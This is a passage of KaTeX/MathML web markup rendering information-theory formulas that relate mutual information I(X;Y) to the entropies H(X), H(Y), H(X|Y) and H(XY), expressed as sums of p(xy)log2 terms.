display="block"><semantics><mrow><mi>I</mi><mo stretchy="false">(</mo><mi>X</mi><mo separator="true">;</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>E</mi><mo stretchy="false">[</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">;</mo><mi>y</mi><mo stretchy="false">)</mo><mo stretchy="false">]</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">;</mo><mi>y</mi><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi mathvariant="normal">∣</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mi mathvariant="normal">∣</mi><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>+</mo><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>−</mo><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">I(X;Y)=E[I(x;y)]=\sum_{x\in X}\sum_{y\in Y}p(xy)I(x;y)\\=H(X)-H(X|Y)=H(Y)-H(Y|X)=H(X)+H(Y)-H(XY)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="mopen">[</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mclose">]</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.480449em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.36687em;vertical-align:0em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mord">∣</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span></span></span></span></span></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><mi>I</mi><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">;</mo><mi>y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mspace linebreak="newline"></mspace><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow></mfrac><mspace linebreak="newline"></mspace><mi>H</mi><mo stretchy="false">(</mo><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac><mspace linebreak="newline"></mspace><mi>H</mi><mo stretchy="false">(</mo><mi>X</mi><mi>Y</mi><mo stretchy="false">)</mo><mo>=</mo><munder><mo>∑</mo><mrow><mi>x</mi><mo>∈</mo><mi>X</mi></mrow></munder><munder><mo>∑</mo><mrow><mi>y</mi><mo>∈</mo><mi>Y</mi></mrow></munder><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo><msub><mo><mi>log</mi><mo>⁡</mo></mo><mn>2</mn></msub><mfrac><mn>1</mn><mrow><mi>p</mi><mo stretchy="false">(</mo><mi>x</mi><mi>y</mi><mo stretchy="false">)</mo></mrow></mfrac></mrow><annotation encoding="application/x-tex">\sum_{x\in X}\sum_{y\in Y}p(xy)I(x;y)=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{p(xy)}{p(x)p(y)}\\H(X)=\sum_{x\in X}p(x)\log_2\frac{1}{p(x)}=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{1}{p(x)}\\H(Y)=\sum_{y\in Y}p(y)\log_2\frac{1}{p(y)}=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{1}{p(y)}\\H(XY)=\sum_{x\in X}\sum_{y\in Y}p(xy)\log_2\frac{1}{p(xy)}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.480449em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mord mathnormal" style="margin-right:0.07847em;">I</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">;</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.857444em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.427em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.6431459999999998em;vertical-align:-1.321706em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.751884em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.751884em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:2.751884em;vertical-align:-1.430444em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.07847em;">X</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.321706em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.050005em;"><span style="top:-1.8556639999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">∈</span><span class="mord mathnormal mtight" style="margin-right:0.22222em;">Y</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.430444em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.20696799999999996em;"><span style="top:-2.4558600000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.24414em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.32144em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathnormal">p</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.936em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.08125em;">H</span><span class="mopen">(</span><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord mathnormal" 